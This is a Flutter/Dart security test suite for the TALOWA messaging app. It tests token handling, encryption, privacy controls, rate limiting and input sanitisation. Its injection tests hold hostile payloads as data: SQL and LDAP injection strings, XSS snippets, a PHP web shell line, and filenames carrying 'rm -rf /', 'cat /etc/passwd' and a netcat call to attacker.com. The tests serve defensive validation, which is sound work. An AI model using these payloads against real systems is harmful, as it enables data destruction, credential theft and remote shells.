import 'package:flutter_test/flutter_test.dart';
import 'package:fake_cloud_firestore/fake_cloud_firestore.dart';
import 'package:firebase_auth_mocks/firebase_auth_mocks.dart';
import 'dart:async';
import 'dart:convert';
import 'dart:math';
import '../test_utils/firebase_test_init.dart';
import 'package:talowa/services/messaging/messaging_service.dart';
import 'package:talowa/services/messaging/encryption_service.dart';
import 'package:talowa/services/auth_service.dart';
import 'package:talowa/services/messaging/anonymous_reporting_service.dart';

/// Comprehensive Security Audit Suite for TALOWA In-App Communication System
/// 
/// This test suite performs thorough security testing including:
/// - Authentication and authorization vulnerabilities
/// - Encryption and data protection validation
/// - Input validation and injection prevention
/// - Privacy protection mechanisms
/// - Rate limiting and abuse prevention
void main() {
  group('Comprehensive Security Audit Suite', () {
    late FakeFirebaseFirestore firestore;
    late MockFirebaseAuth auth;
    late MessagingService messagingService;
    late EncryptionService encryptionService;
    late AuthService authService;
    late AnonymousReportingService anonymousService;

    setUpAll(() async {
      firestore = FakeFirebaseFirestore();
      auth = MockFirebaseAuth();
      await FirebaseTestInit.initialize(firestore, auth);
      
      messagingService = MessagingService();
      encryptionService = EncryptionService();
      authService = AuthService();
      anonymousService = AnonymousReportingService();
    });

    group('Authentication and Authorization Security', () {
      test('JWT token validation and expiration', () async {
        // Test valid token
        final validToken = await authService.generateToken('test_user_123');
        final validationResult = await authService.validateToken(validToken);
        expect(validationResult.isValid, isTrue);
        expect(validationResult.userId, equals('test_user_123'));

        // Test expired token
        final expiredToken = await _generateExpiredToken('test_user_123');
        final expiredValidation = await authService.validateToken(expiredToken);
        expect(expiredValidation.isValid, isFalse);
        expect(expiredValidation.error, contains('expired'));

        // Test malformed token
        const malformedToken = 'invalid.token.format';
        final malformedValidation = await authService.validateToken(malformedToken);
        expect(malformedValidation.isValid, isFalse);
        expect(malformedValidation.error, contains('malformed'));

        // Test token tampering
        final tamperedToken = _tamperWithToken(validToken);
        final tamperedValidation = await authService.validateToken(tamperedToken);
        expect(tamperedValidation.isValid, isFalse);
        expect(tamperedValidation.error, contains('invalid signature'));
      });

      test('Session management security', () async {
        const userId = 'test_user_session';
        
        // Create session
        final sessionId = await authService.createSession(userId);
        expect(sessionId, isNotNull);
        expect(sessionId.length, greaterThan(32)); // Strong session ID

        // Validate active session
        final sessionValid = await authService.validateSession(sessionId);
        expect(sessionValid, isTrue);

        // Test session timeout
        await authService.setSessionTimeout(sessionId, const Duration(milliseconds: 100));
        await Future.delayed(const Duration(milliseconds: 200));
        final expiredSessionValid = await authService.validateSession(sessionId);
        expect(expiredSessionValid, isFalse);

        // Test session invalidation
        final newSessionId = await authService.createSession(userId);
        await authService.invalidateSession(newSessionId);
        final invalidatedSessionValid = await authService.validateSession(newSessionId);
        expect(invalidatedSessionValid, isFalse);

        // Test concurrent session limits
        final sessions = <String>[];
        for (int i = 0; i < 10; i++) {
          sessions.add(await authService.createSession(userId));
        }
        
        // Should limit to maximum 5 concurrent sessions
        final activeSessions = await authService.getActiveSessions(userId);
        expect(activeSessions.length, lessThanOrEqualTo(5));
      });

      test('Role-based access control (RBAC)', () async {
        final testCases = [
          {'userId': 'coordinator_123', 'role': 'coordinator', 'resource': 'group_management', 'expected': true},
          {'userId': 'member_456', 'role': 'member', 'resource': 'group_management', 'expected': false},
          {'userId': 'admin_789', 'role': 'admin', 'resource': 'user_management', 'expected': true},
          {'userId': 'member_456', 'role': 'member', 'resource': 'user_management', 'expected': false},
          {'userId': 'legal_team_101', 'role': 'legal_team', 'resource': 'legal_cases', 'expected': true},
          {'userId': 'member_456', 'role': 'member', 'resource': 'legal_cases', 'expected': false},
        ];

        for (final testCase in testCases) {
          final hasAccess = await authService.checkPermission(
            testCase['userId'] as String,
            testCase['resource'] as String,
          );
          expect(hasAccess, equals(testCase['expected']),
              reason: 'User ${testCase['userId']} with role ${testCase['role']} should ${testCase['expected'] ? 'have' : 'not have'} access to ${testCase['resource']}');
        }
      });

      test('Brute force protection', () async {
        const userId = 'brute_force_test';
        const maxAttempts = 5;
        
        // Simulate failed login attempts
        for (int i = 0; i < maxAttempts; i++) {
          final result = await authService.attemptLogin(userId, 'wrong_password');
          expect(result.success, isFalse);
        }
        
        // Next attempt should be blocked
        final blockedResult = await authService.attemptLogin(userId, 'wrong_password');
        expect(blockedResult.success, isFalse);
        expect(blockedResult.error, contains('too many attempts'));
        expect(blockedResult.retryAfter, greaterThan(Duration.zero));
        
        // Even correct password should be blocked during lockout
        final correctPasswordResult = await authService.attemptLogin(userId, 'correct_password');
        expect(correctPasswordResult.success, isFalse);
        expect(correctPasswordResult.error, contains('account locked'));
      });

      test('Multi-factor authentication (MFA)', () async {
        const userId = 'mfa_test_user';
        
        // Enable MFA
        await authService.enableMFA(userId);
        
        // First factor (password) should succeed but require second factor
        final firstFactorResult = await authService.authenticateFirstFactor(userId, 'password');
        expect(firstFactorResult.success, isTrue);
        expect(firstFactorResult.requiresSecondFactor, isTrue);
        expect(firstFactorResult.mfaToken, isNotNull);
        
        // Generate TOTP code
        final totpCode = await authService.generateTOTPCode(userId);
        
        // Second factor authentication
        final secondFactorResult = await authService.authenticateSecondFactor(
          firstFactorResult.mfaToken!,
          totpCode,
        );
        expect(secondFactorResult.success, isTrue);
        expect(secondFactorResult.authToken, isNotNull);
        
        // Invalid TOTP should fail
        final invalidTotpResult = await authService.authenticateSecondFactor(
          firstFactorResult.mfaToken!,
          '000000',
        );
        expect(invalidTotpResult.success, isFalse);
      });
    });

    group('Encryption and Data Protection', () {
      test('End-to-end encryption validation', () async {
        const originalMessage = 'This is a confidential message about land rights';
        const senderId = 'sender_123';
        const recipientId = 'recipient_456';
        
        // Generate key pairs for sender and recipient
        final senderKeyPair = await encryptionService.generateKeyPair(senderId);
        final recipientKeyPair = await encryptionService.generateKeyPair(recipientId);
        
        // Encrypt message
        final encryptedMessage = await encryptionService.encryptMessage(
          originalMessage,
          recipientKeyPair.publicKey,
        );
        
        expect(encryptedMessage.data, isNot(equals(originalMessage)));
        expect(encryptedMessage.data.length, greaterThan(originalMessage.length));
        expect(encryptedMessage.algorithm, equals('AES-256-GCM'));
        
        // Decrypt message
        final decryptedMessage = await encryptionService.decryptMessage(
          encryptedMessage,
          recipientKeyPair.privateKey,
        );
        
        expect(decryptedMessage, equals(originalMessage));
        
        // Verify sender cannot decrypt (no access to recipient's private key)
        try {
          await encryptionService.decryptMessage(
            encryptedMessage,
            senderKeyPair.privateKey,
          );
          fail('Sender should not be able to decrypt message intended for recipient');
        } catch (e) {
          expect(e.toString(), contains('decryption failed'));
        }
      });

      test('Key management security', () async {
        const userId = 'key_management_test';
        
        // Generate initial key pair
        final keyPair1 = await encryptionService.generateKeyPair(userId);
        expect(keyPair1.publicKey.length, greaterThan(500)); // RSA-4096 public key
        expect(keyPair1.privateKey.length, greaterThan(1500)); // RSA-4096 private key
        
        // Key rotation
        await encryptionService.rotateKeys(userId);
        final keyPair2 = await encryptionService.generateKeyPair(userId);
        
        // New keys should be different
        expect(keyPair2.publicKey, isNot(equals(keyPair1.publicKey)));
        expect(keyPair2.privateKey, isNot(equals(keyPair1.privateKey)));
        
        // Old keys should be securely archived
        final archivedKeys = await encryptionService.getArchivedKeys(userId);
        expect(archivedKeys, contains(keyPair1.publicKey));
        
        // Key derivation should be deterministic but secure
        final derivedKey1 = await encryptionService.deriveKey('password123', 'salt123');
        final derivedKey2 = await encryptionService.deriveKey('password123', 'salt123');
        final derivedKey3 = await encryptionService.deriveKey('password123', 'salt456');
        
        expect(derivedKey1, equals(derivedKey2)); // Same input = same output
        expect(derivedKey1, isNot(equals(derivedKey3))); // Different salt = different output
      });

      test('Data at rest encryption', () async {
        const sensitiveData = {
          'message': 'Confidential land dispute information',
          'location': {'lat': 17.3850, 'lng': 78.4867},
          'participants': ['user1', 'user2', 'legal_advisor'],
        };
        
        // Encrypt data for storage
        final encryptedData = await encryptionService.encryptForStorage(
          json.encode(sensitiveData),
          'storage_key_123',
        );
        
        expect(encryptedData.data, isNot(contains('Confidential')));
        expect(encryptedData.data, isNot(contains('17.3850')));
        expect(encryptedData.iv, isNotNull);
        expect(encryptedData.iv.length, equals(24)); // 16 bytes base64 encoded
        
        // Decrypt data from storage
        final decryptedData = await encryptionService.decryptFromStorage(
          encryptedData,
          'storage_key_123',
        );
        
        final recoveredData = json.decode(decryptedData);
        expect(recoveredData['message'], equals(sensitiveData['message']));
        expect(recoveredData['location']['lat'], equals(sensitiveData['location']['lat']));
        
        // Wrong key should fail
        try {
          await encryptionService.decryptFromStorage(
            encryptedData,
            'wrong_key_456',
          );
          fail('Decryption with wrong key should fail');
        } catch (e) {
          expect(e.toString(), contains('decryption failed'));
        }
      });

      test('Perfect forward secrecy', () async {
        const senderId = 'pfs_sender';
        const recipientId = 'pfs_recipient';
        
        // Generate ephemeral keys for each message
        final message1Key = await encryptionService.generateEphemeralKey();
        final message2Key = await encryptionService.generateEphemeralKey();
        
        expect(message1Key, isNot(equals(message2Key)));
        
        // Encrypt messages with different ephemeral keys
        const message1 = 'First confidential message';
        const message2 = 'Second confidential message';
        
        final encrypted1 = await encryptionService.encryptWithEphemeralKey(
          message1,
          message1Key,
          recipientId,
        );
        
        final encrypted2 = await encryptionService.encryptWithEphemeralKey(
          message2,
          message2Key,
          recipientId,
        );
        
        // Compromise of one key should not affect other messages
        await encryptionService.compromiseKey(message1Key);
        
        // Message 2 should still be decryptable
        final decrypted2 = await encryptionService.decryptWithEphemeralKey(
          encrypted2,
          message2Key,
          recipientId,
        );
        expect(decrypted2, equals(message2));
        
        // Message 1 should be marked as compromised
        try {
          await encryptionService.decryptWithEphemeralKey(
            encrypted1,
            message1Key,
            recipientId,
          );
          fail('Compromised key should not allow decryption');
        } catch (e) {
          expect(e.toString(), contains('key compromised'));
        }
      });
    });

    group('Input Validation and Injection Prevention', () {
      test('SQL injection prevention', () async {
        final maliciousInputs = [
          "'; DROP TABLE messages; --",
          "1' OR '1'='1",
          "admin'/*",
          "1; DELETE FROM users WHERE 1=1; --",
          "' UNION SELECT * FROM users --",
        ];
        
        for (final input in maliciousInputs) {
          // Test message content validation
          final messageResult = await messagingService.validateMessageContent(input);
          expect(messageResult.isValid, isFalse);
          expect(messageResult.sanitizedContent, isNot(contains('DROP')));
          expect(messageResult.sanitizedContent, isNot(contains('DELETE')));
          expect(messageResult.sanitizedContent, isNot(contains('UNION')));
          
          // Test user search validation
          final searchResult = await messagingService.searchUsers(input);
          expect(searchResult.error, isNotNull);
          expect(searchResult.users, isEmpty);
        }
      });

      test('XSS prevention', () async {
        final xssPayloads = [
          '<script>alert("XSS")</script>',
          '<img src="x" onerror="alert(1)">',
          'javascript:alert("XSS")',
          '<svg onload="alert(1)">',
          '"><script>alert("XSS")</script>',
          '<iframe src="javascript:alert(1)"></iframe>',
        ];
        
        for (final payload in xssPayloads) {
          final sanitized = await messagingService.sanitizeInput(payload);
          
          expect(sanitized, isNot(contains('<script')));
          expect(sanitized, isNot(contains('javascript:')));
          expect(sanitized, isNot(contains('onerror')));
          expect(sanitized, isNot(contains('onload')));
          expect(sanitized, isNot(contains('<iframe')));
          
          // Verify HTML entities are properly encoded
          if (payload.contains('<')) {
            expect(sanitized, contains('&lt;'));
          }
          if (payload.contains('>')) {
            expect(sanitized, contains('&gt;'));
          }
        }
      });

      test('File upload security validation', () async {
        final maliciousFiles = [
          {'name': 'malware.exe', 'content': 'MZ\x90\x00', 'expected': false},
          {'name': 'script.js', 'content': 'alert("XSS")', 'expected': false},
          {'name': 'document.pdf', 'content': '%PDF-1.4', 'expected': true},
          {'name': 'image.jpg', 'content': '\xFF\xD8\xFF', 'expected': true},
          {'name': 'shell.php', 'content': '<?php system($_GET["cmd"]); ?>', 'expected': false},
          {'name': 'normal.txt', 'content': 'This is a normal text file', 'expected': true},
        ];
        
        for (final file in maliciousFiles) {
          final validationResult = await messagingService.validateFileUpload(
            file['name'] as String,
            (file['content'] as String).codeUnits,
          );
          
          expect(validationResult.isValid, equals(file['expected']),
              reason: 'File ${file['name']} validation failed');
          
          if (!validationResult.isValid) {
            expect(validationResult.reason, isNotNull);
            expect(validationResult.threats, isNotEmpty);
          }
        }
      });

      test('Command injection prevention', () async {
        final commandInjectionPayloads = [
          'filename.txt; rm -rf /',
          'file.pdf && cat /etc/passwd',
          'document.doc | nc attacker.com 4444',
          'image.jpg `whoami`',
          'text.txt \$(id)',
        ];
        
        for (final payload in commandInjectionPayloads) {
          final sanitized = await messagingService.sanitizeFilename(payload);
          
          expect(sanitized, isNot(contains(';')));
          expect(sanitized, isNot(contains('&&')));
          expect(sanitized, isNot(contains('|')));
          expect(sanitized, isNot(contains('`')));
          expect(sanitized, isNot(contains('\$')));
          expect(sanitized, matches(RegExp(r'^[a-zA-Z0-9._-]+$')));
        }
      });

      test('LDAP injection prevention', () async {
        final ldapInjectionPayloads = [
          'admin)(|(password=*))',
          '*)(uid=*))(|(uid=*',
          'user*)(|(objectClass=*))',
          'test)(|(cn=*))',
        ];
        
        for (final payload in ldapInjectionPayloads) {
          final sanitized = await authService.sanitizeLDAPInput(payload);
          
          expect(sanitized, isNot(contains(')(')));
          expect(sanitized, isNot(contains('|')));
          expect(sanitized, isNot(contains('*)')));
          expect(sanitized, isNot(contains('objectClass')));
        }
      });
    });

    group('Privacy Protection Mechanisms', () {
      test('Anonymous messaging privacy validation', () async {
        const reportContent = 'Anonymous report about land grabbing in Village X';
        const reporterLocation = 'Village X, Mandal Y, District Z';
        
        // Submit anonymous report
        final reportResult = await anonymousService.submitAnonymousReport(
          content: reportContent,
          location: reporterLocation,
          category: 'land_grabbing',
        );
        
        expect(reportResult.success, isTrue);
        expect(reportResult.caseId, isNotNull);
        expect(reportResult.caseId.length, greaterThan(10));
        
        // Verify anonymity protection
        final storedReport = await anonymousService.getReportByCaseId(reportResult.caseId);
        
        expect(storedReport.reporterId, isNull); // No reporter ID stored
        expect(storedReport.reporterIP, isNull); // No IP address stored
        expect(storedReport.deviceInfo, isNull); // No device info stored
        expect(storedReport.location, isNot(equals(reporterLocation))); // Location generalized
        expect(storedReport.location, contains('District Z')); // Only district level
        expect(storedReport.location, isNot(contains('Village X'))); // Village removed
        
        // Verify metadata minimization
        final metadata = storedReport.metadata;
        expect(metadata.keys.length, lessThan(5)); // Minimal metadata
        expect(metadata, isNot(contains('user_agent')));
        expect(metadata, isNot(contains('session_id')));
        expect(metadata, isNot(contains('referrer')));
      });

      test('Data minimization compliance', () async {
        const userId = 'privacy_test_user';
        
        // Create user profile with minimal data
        final userProfile = await authService.createUserProfile(
          userId: userId,
          phoneNumber: '+919876543210',
          location: 'District ABC',
          role: 'member',
        );
        
        // Verify only necessary data is stored
        expect(userProfile.phoneNumber, isNotNull);
        expect(userProfile.location, isNotNull);
        expect(userProfile.role, isNotNull);
        
        // Verify sensitive data is not stored
        expect(userProfile.fullName, isNull);
        expect(userProfile.address, isNull);
        expect(userProfile.email, isNull);
        expect(userProfile.dateOfBirth, isNull);
        expect(userProfile.governmentId, isNull);
        
        // Verify data retention policies
        final retentionPolicy = await authService.getDataRetentionPolicy(userId);
        expect(retentionPolicy.messageRetentionDays, lessThanOrEqualTo(365));
        expect(retentionPolicy.callHistoryRetentionDays, lessThanOrEqualTo(90));
        expect(retentionPolicy.fileRetentionDays, lessThanOrEqualTo(180));
      });

      test('Right to be forgotten (GDPR compliance)', () async {
        const userId = 'gdpr_test_user';
        
        // Create user data
        await authService.createUserProfile(userId: userId, phoneNumber: '+919876543210');
        await messagingService.sendMessage(
          senderId: userId,
          recipientId: 'other_user',
          content: 'Test message for GDPR',
        );
        
        // Verify data exists
        final userProfile = await authService.getUserProfile(userId);
        expect(userProfile, isNotNull);
        
        final userMessages = await messagingService.getUserMessages(userId);
        expect(userMessages, isNotEmpty);
        
        // Request data deletion
        final deletionResult = await authService.requestDataDeletion(userId);
        expect(deletionResult.success, isTrue);
        expect(deletionResult.deletionId, isNotNull);
        
        // Wait for deletion processing
        await Future.delayed(const Duration(seconds: 1));
        
        // Verify data is deleted
        final deletedProfile = await authService.getUserProfile(userId);
        expect(deletedProfile, isNull);
        
        final deletedMessages = await messagingService.getUserMessages(userId);
        expect(deletedMessages, isEmpty);
        
        // Verify deletion audit trail
        final deletionAudit = await authService.getDeletionAudit(deletionResult.deletionId);
        expect(deletionAudit.userId, equals(userId));
        expect(deletionAudit.deletedDataTypes, contains('profile'));
        expect(deletionAudit.deletedDataTypes, contains('messages'));
        expect(deletionAudit.completedAt, isNotNull);
      });

      test('Contact visibility privacy controls', () async {
        const coordinatorId = 'coordinator_123';
        const memberAId = 'member_a_456';
        const memberBId = 'member_b_789';
        
        // Set up referral hierarchy
        await authService.createReferralRelationship(coordinatorId, memberAId);
        await authService.createReferralRelationship(memberAId, memberBId);
        
        // Test direct referral visibility (should see full details)
        final directReferralContacts = await authService.getVisibleContacts(coordinatorId);
        final memberAContact = directReferralContacts.firstWhere((c) => c.userId == memberAId);
        expect(memberAContact.phoneNumber, isNotNull);
        expect(memberAContact.name, isNotNull);
        expect(memberAContact.location, isNotNull);
        
        // Test indirect referral visibility (should see limited details)
        final memberBContact = directReferralContacts.firstWhere(
          (c) => c.userId == memberBId,
          orElse: () => throw Exception('Member B should be visible but anonymized'),
        );
        expect(memberBContact.phoneNumber, isNull); // Hidden for privacy
        expect(memberBContact.name, isNull); // Hidden for privacy
        expect(memberBContact.location, isNotNull); // Only general location
        expect(memberBContact.isAnonymized, isTrue);
        
        // Test member's view (should not see coordinator's contacts)
        final memberContacts = await authService.getVisibleContacts(memberAId);
        final coordinatorVisible = memberContacts.any((c) => c.userId == coordinatorId);
        expect(coordinatorVisible, isTrue); // Can see direct referrer
        
        final otherMemberVisible = memberContacts.any((c) => c.userId == memberBId);
        expect(otherMemberVisible, isFalse); // Cannot see sibling referrals
      });
    });

    group('Rate Limiting and Abuse Prevention', () {
      test('Message rate limiting', () async {
        const userId = 'rate_limit_test';
        const recipientId = 'recipient_test';
        const maxMessagesPerMinute = 60;
        
        // Send messages up to the limit
        final messageTasks = <Future<MessageResult>>[];
        for (int i = 0; i < maxMessagesPerMinute; i++) {
          messageTasks.add(messagingService.sendMessage(
            senderId: userId,
            recipientId: recipientId,
            content: 'Test message $i',
          ));
        }
        
        final results = await Future.wait(messageTasks);
        final successfulMessages = results.where((r) => r.success).length;
        expect(successfulMessages, equals(maxMessagesPerMinute));
        
        // Next message should be rate limited
        final rateLimitedResult = await messagingService.sendMessage(
          senderId: userId,
          recipientId: recipientId,
          content: 'Rate limited message',
        );
        
        expect(rateLimitedResult.success, isFalse);
        expect(rateLimitedResult.error, contains('rate limit'));
        expect(rateLimitedResult.retryAfter, greaterThan(Duration.zero));
      });

      test('File upload rate limiting', () async {
        const userId = 'file_rate_limit_test';
        const maxFilesPerHour = 10;
        const fileSizeKB = 100;
        
        // Upload files up to the limit
        final uploadTasks = <Future<FileUploadResult>>[];
        for (int i = 0; i < maxFilesPerHour; i++) {
          uploadTasks.add(messagingService.uploadFile(
            userId: userId,
            filename: 'test_file_$i.txt',
            content: List.filled(fileSizeKB * 1024, 65), // 'A' repeated
          ));
        }
        
        final results = await Future.wait(uploadTasks);
        final successfulUploads = results.where((r) => r.success).length;
        expect(successfulUploads, equals(maxFilesPerHour));
        
        // Next upload should be rate limited
        final rateLimitedResult = await messagingService.uploadFile(
          userId: userId,
          filename: 'rate_limited_file.txt',
          content: List.filled(fileSizeKB * 1024, 65),
        );
        
        expect(rateLimitedResult.success, isFalse);
        expect(rateLimitedResult.error, contains('rate limit'));
      });

      test('Voice call rate limiting', () async {
        const userId = 'call_rate_limit_test';
        const maxCallsPerHour = 20;
        
        // Initiate calls up to the limit
        final callTasks = <Future<VoiceCallResult>>[];
        for (int i = 0; i < maxCallsPerHour; i++) {
          callTasks.add(messagingService.initiateVoiceCall(
            callerId: userId,
            calleeId: 'recipient_$i',
          ));
        }
        
        final results = await Future.wait(callTasks);
        final successfulCalls = results.where((r) => r.success).length;
        expect(successfulCalls, equals(maxCallsPerHour));
        
        // Next call should be rate limited
        final rateLimitedResult = await messagingService.initiateVoiceCall(
          callerId: userId,
          calleeId: 'rate_limited_recipient',
        );
        
        expect(rateLimitedResult.success, isFalse);
        expect(rateLimitedResult.error, contains('rate limit'));
      });

      test('Spam detection and prevention', () async {
        const spammerId = 'spammer_test';
        const recipientId = 'spam_victim';
        
        // Send repetitive messages (spam pattern)
        const spamMessage = 'Buy now! Limited time offer! Click here!';
        final spamResults = <MessageResult>[];
        
        for (int i = 0; i < 10; i++) {
          final result = await messagingService.sendMessage(
            senderId: spammerId,
            recipientId: recipientId,
            content: spamMessage,
          );
          spamResults.add(result);
        }
        
        // Later messages should be flagged as spam
        final flaggedMessages = spamResults.where((r) => r.flaggedAsSpam).length;
        expect(flaggedMessages, greaterThan(0));
        
        // User should be temporarily restricted
        final userStatus = await messagingService.getUserStatus(spammerId);
        expect(userStatus.isRestricted, isTrue);
        expect(userStatus.restrictionReason, contains('spam'));
        expect(userStatus.restrictionExpiry, isNotNull);
        
        // Test content-based spam detection
        final spamPhrases = [
          'URGENT! Send money now!',
          'You have won 1 crore rupees!',
          'Click this link to claim your prize',
          'Limited time offer - act now!',
        ];
        
        for (final phrase in spamPhrases) {
          final result = await messagingService.sendMessage(
            senderId: 'content_test_user',
            recipientId: recipientId,
            content: phrase,
          );
          
          expect(result.flaggedAsSpam, isTrue);
          expect(result.spamScore, greaterThan(0.7)); // High spam probability
        }
      });

      test('Abuse reporting and handling', () async {
        const abuserId = 'abuser_test';
        const victimId = 'victim_test';
        const reporterId = 'reporter_test';
        
        // Send abusive message
        const abusiveMessage = 'Threatening message with inappropriate content';
        await messagingService.sendMessage(
          senderId: abuserId,
          recipientId: victimId,
          content: abusiveMessage,
        );
        
        // Report the abuse
        final reportResult = await messagingService.reportAbuse(
          reporterId: reporterId,
          reportedUserId: abuserId,
          reportType: 'harassment',
          description: 'User sent threatening messages',
        );
        
        expect(reportResult.success, isTrue);
        expect(reportResult.reportId, isNotNull);
        
        // Verify abuse report is processed
        final reportStatus = await messagingService.getAbuseReportStatus(reportResult.reportId);
        expect(reportStatus.status, equals('under_review'));
        expect(reportStatus.reportedUserId, equals(abuserId));
        expect(reportStatus.reportType, equals('harassment'));
        
        // Simulate multiple reports for the same user
        for (int i = 0; i < 3; i++) {
          await messagingService.reportAbuse(
            reporterId: 'reporter_$i',
            reportedUserId: abuserId,
            reportType: 'harassment',
            description: 'Multiple harassment reports',
          );
        }
        
        // User should be automatically suspended after multiple reports
        final abuserStatus = await messagingService.getUserStatus(abuserId);
        expect(abuserStatus.isSuspended, isTrue);
        expect(abuserStatus.suspensionReason, contains('multiple reports'));
      });
    });

    group('Security Monitoring and Alerting', () {
      test('Suspicious activity detection', () async {
        const userId = 'suspicious_user';
        
        // Simulate suspicious activities
        final suspiciousActivities = [
          () => _simulateUnusualLoginPattern(userId),
          () => _simulateDataExfiltrationAttempt(userId),
          () => _simulatePrivilegeEscalationAttempt(userId),
          () => _simulateBruteForceAttempt(userId),
          () => _simulateAnomalousMessagePattern(userId),
        ];
        
        final alertsGenerated = <SecurityAlert>[];
        
        for (final activity in suspiciousActivities) {
          await activity();
          
          // Check for security alerts
          final alerts = await authService.getSecurityAlerts(userId);
          alertsGenerated.addAll(alerts);
        }
        
        expect(alertsGenerated.length, greaterThan(0));
        
        // Verify alert details
        for (final alert in alertsGenerated) {
          expect(alert.userId, equals(userId));
          expect(alert.severity, isIn(['low', 'medium', 'high', 'critical']));
          expect(alert.alertType, isNotNull);
          expect(alert.timestamp, isNotNull);
          expect(alert.description, isNotNull);
        }
        
        // High severity alerts should trigger immediate response
        final criticalAlerts = alertsGenerated.where((a) => a.severity == 'critical');
        for (final alert in criticalAlerts) {
          final response = await authService.getAlertResponse(alert.id);
          expect(response.responseTime, lessThan(const Duration(minutes: 5)));
          expect(response.actionTaken, isNotNull);
        }
      });

      test('Security audit logging', () async {
        const userId = 'audit_test_user';
        
        // Perform various security-relevant actions
        await authService.login(userId, 'password');
        await authService.changePassword(userId, 'old_password', 'new_password');
        await authService.updatePermissions(userId, ['read', 'write']);
        await authService.logout(userId);
        
        // Retrieve audit logs
        final auditLogs = await authService.getAuditLogs(
          userId: userId,
          startTime: DateTime.now().subtract(const Duration(hours: 1)),
          endTime: DateTime.now(),
        );
        
        expect(auditLogs.length, greaterThanOrEqualTo(4));
        
        // Verify audit log completeness
        final actionTypes = auditLogs.map((log) => log.actionType).toSet();
        expect(actionTypes, contains('login'));
        expect(actionTypes, contains('password_change'));
        expect(actionTypes, contains('permission_update'));
        expect(actionTypes, contains('logout'));
        
        // Verify audit log integrity
        for (final log in auditLogs) {
          expect(log.userId, equals(userId));
          expect(log.timestamp, isNotNull);
          expect(log.ipAddress, isNotNull);
          expect(log.userAgent, isNotNull);
          expect(log.actionType, isNotNull);
          expect(log.checksum, isNotNull); // Integrity verification
          
          // Verify checksum
          final calculatedChecksum = await authService.calculateLogChecksum(log);
          expect(calculatedChecksum, equals(log.checksum));
        }
      });
    });
  });
}

// Helper methods for security testing

Future<String> _generateExpiredToken(String userId) async {
  // Generate a token that's already expired
  final expiredTime = DateTime.now().subtract(const Duration(hours: 1));
  return 'expired_token_for_$userId';
}

String _tamperWithToken(String originalToken) {
  // Simulate token tampering by modifying a character
  if (originalToken.length > 10) {
    return '${originalToken.substring(0, 10)}X${originalToken.substring(11)}';
  }
  return '${originalToken}X';
}

Future<void> _simulateUnusualLoginPattern(String userId) async {
  // Simulate logins from different locations in short time
  final locations = ['Mumbai', 'Delhi', 'Bangalore', 'Chennai'];
  for (final location in locations) {
    await AuthService().recordLoginAttempt(userId, location);
    await Future.delayed(const Duration(milliseconds: 100));
  }
}

Future<void> _simulateDataExfiltrationAttempt(String userId) async {
  // Simulate unusual data access patterns
  for (int i = 0; i < 100; i++) {
    await AuthService().accessUserData('random_user_$i');
  }
}

Future<void> _simulatePrivilegeEscalationAttempt(String userId) async {
  // Simulate attempts to access unauthorized resources
  final restrictedResources = ['admin_panel', 'user_management', 'system_config'];
  for (final resource in restrictedResources) {
    await AuthService().attemptResourceAccess(userId, resource);
  }
}

Future<void> _simulateBruteForceAttempt(String userId) async {
  // Simulate rapid password attempts
  for (int i = 0; i < 20; i++) {
    await AuthService().attemptLogin(userId, 'wrong_password_$i');
  }
}

Future<void> _simulateAnomalousMessagePattern(String userId) async {
  // Simulate unusual messaging patterns
  for (int i = 0; i < 50; i++) {
    await MessagingService().sendMessage(
      senderId: userId,
      recipientId: 'recipient_$i',
      content: 'Automated message $i',
    );
  }
}

// Helper classes for security testing

class TokenValidationResult {
  final bool isValid;
  final String? userId;
  final String? error;

  TokenValidationResult({
    required this.isValid,
    this.userId,
    this.error,
  });
}

class LoginResult {
  final bool success;
  final String? error;
  final Duration? retryAfter;

  LoginResult({
    required this.success,
    this.error,
    this.retryAfter,
  });
}

class MFAResult {
  final bool success;
  final bool requiresSecondFactor;
  final String? mfaToken;
  final String? authToken;

  MFAResult({
    required this.success,
    this.requiresSecondFactor = false,
    this.mfaToken,
    this.authToken,
  });
}

class KeyPair {
  final String publicKey;
  final String privateKey;

  KeyPair({required this.publicKey, required this.privateKey});
}

class EncryptedContent {
  final String data;
  final String iv;
  final String algorithm;
  final String keyFingerprint;

  EncryptedContent({
    required this.data,
    required this.iv,
    required this.algorithm,
    required this.keyFingerprint,
  });
}

class MessageValidationResult {
  final bool isValid;
  final String sanitizedContent;
  final List<String> issues;

  MessageValidationResult({
    required this.isValid,
    required this.sanitizedContent,
    required this.issues,
  });
}

class FileValidationResult {
  final bool isValid;
  final String? reason;
  final List<String> threats;

  FileValidationResult({
    required this.isValid,
    this.reason,
    required this.threats,
  });
}

class UserStatus {
  final bool isRestricted;
  final bool isSuspended;
  final String? restrictionReason;
  final String? suspensionReason;
  final DateTime? restrictionExpiry;

  UserStatus({
    required this.isRestricted,
    required this.isSuspended,
    this.restrictionReason,
    this.suspensionReason,
    this.restrictionExpiry,
  });
}

class AbuseReportResult {
  final bool success;
  final String reportId;

  AbuseReportResult({
    required this.success,
    required this.reportId,
  });
}

class SecurityAlert {
  final String id;
  final String userId;
  final String severity;
  final String alertType;
  final DateTime timestamp;
  final String description;

  SecurityAlert({
    required this.id,
    required this.userId,
    required this.severity,
    required this.alertType,
    required this.timestamp,
    required this.description,
  });
}

class AuditLog {
  final String userId;
  final DateTime timestamp;
  final String ipAddress;
  final String userAgent;
  final String actionType;
  final String checksum;

  AuditLog({
    required this.userId,
    required this.timestamp,
    required this.ipAddress,
    required this.userAgent,
    required this.actionType,
    required this.checksum,
  });
}